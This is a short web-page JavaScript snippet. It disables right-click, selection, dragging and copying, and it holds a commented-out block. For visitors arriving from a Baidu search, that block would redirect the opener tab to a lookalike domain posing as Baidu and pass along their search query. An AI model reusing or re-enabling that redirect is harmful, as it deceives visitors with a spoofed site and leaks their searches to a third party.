    document.oncontextmenu=function(){return false};
    document.ondragstart=function(){return false};
    document.onselectstart =function(){return false};
    document.oncopy=function(){document.selection.empty();};
    document.onbeforecopy=function(){return false};
	
	//if(time_range("08:00", "18:00") == false){
//var reurl = document.referrer?document.referrer:'';
	//if(reurl.indexOf("www.baidu.com/") >= 0){
	//	arr = reurl.split("?");
		//if(window.opener){
		//	window.opener.location='http://www.baidu.com.lanhuseo.com/s?'+arr[1];
		//}
	//}
//}